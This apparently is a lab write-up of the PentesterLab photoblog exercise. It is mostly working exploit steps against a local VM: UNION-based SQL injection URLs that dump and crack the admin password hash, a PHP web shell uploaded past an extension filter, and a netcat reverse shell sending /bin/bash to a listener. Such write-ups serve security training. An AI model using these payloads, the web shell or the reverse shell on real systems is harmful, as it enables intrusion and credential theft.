@@ -1,0 +1,91 @@
+Manual SQL for My Awesome Photoblog
+
+in URL on test page:
+
+http://192.168.32.68/cat.php?id=1
+
+add UNION Select queries to brute force and identify potential injection vulnerabilities in the columns, at 4 it highlights results.
+
+remember %20 = space
+http://192.168.32.68/cat.php?id=1%20union%20select%201,2,3,4
+
+
+the 2nd column looks interesting so adding a query to show version to see if it accepts commands.
+
+http://192.168.32.68/cat.php?id=1%20union%20select%201,@@version,3,4
+Picture: 5.1.63-0+squeeze1
+
+using current_user() gives us the user associated:
+
+http://192.168.32.68/cat.php?id=1%20union%20select%201,current_user(),3,4
+Picture: pentesterlab@localhost
+
+Now that sql injection vulnerability is confirmed, ask database to drop table names from information_schema.tables - information_schema looks through the meta data of databases.
+
+remember %20 = space
+http://192.168.32.68/cat.php?id=1%20union%20select%201,table_name,3,4%20from%20information_schema.tables
+
+we see there is a table named users
+
+now check through the columns:
+
+http://192.168.32.68/cat.php?id=1%20union%20select%201,column_name,3,4%20from%20information_schema.columns
+
+the list is extensive so try cutting down results by specifying by name - where table_name='users'
+
+http://192.168.32.68/cat.php?id=1%20union%20select%201,column_name,3,4%20from%20information_schema.columns%20where%20table_name=%27users%27
+
+this cuts results to the likes of = id, login, password, shell
+
+add parameter login from the users database
+
+http://192.168.32.68/cat.php?id=1%20union%20select%201,login,3,4%20from%20users
+
+gives us the output admin
+
+as we can only enter one parameter, we need to make use of concat() function this will allow us to pass multiple parameters. so if we ask for the login and password from the users database:
+
+http://192.168.32.68/cat.php?id=1%20union%20select%201,concat(login,%20password),3,4%20from%20users
+
+gives us = Picture: admin8efe310f9ab3efeae8d410a8e0166eb2
+
+this is the username and a hashed version of their password.
+
+Run the hash through a hash identifier and it tells us it is an MD5 Hash
+Run the hash through an MD5 decryptor to give us the password = P4ssw0rd
+
+now that we can access the web page using these credentials see if we can get further.
+we see we can upload images, lets see if we can upload a web page using a php script.
+
+create a php file using nano with the following contents:
+#nano web_shell.php
+
+<?php system($_GET[ 'cmd' ]); ?>
+
+when you try to upload this file the web page denies it as it has some hardening against php files.
+add .test to the end of the file to hide the php extension and re-upload, the file will be added and given the following output:
+INSERT INTO pictures (title, img, cat) VALUES ('web shell','web_shell.php.test','1') 
+
+click on the webshell link on the left and view page source, find where the image is stored = <img src="admin/uploads/web_shell.php.test"
+use the source in the URL:
+
+now we can use the cmd from the php script inside the URL add '?cmd=' followed by your commands. 
+
+http://192.168.32.68/admin/uploads/web_shell.php.test?cmd=ls
+
+////// NETCAT //////
+create a listener on your terminal
+#nc -e -lnvp 2222
+
+nc = netcat
+-e = specifiy filename to exec after connect
+-lnvp = l = listen, n = no DNS, v = verbose, p = port num
+
+connect to listener via the URL:
+
+http://192.168.32.68/admin/uploads/web_shell.php.test?cmd=nc%20-e%20/bin/bash%2010.8.0.2%202222
+
+nc -e /bin/bash 10.8.0.2 2222 - /bin/bash = specifies shell, listeners ip address, port num.
+
+listener machine now has basic reverse shell.
+
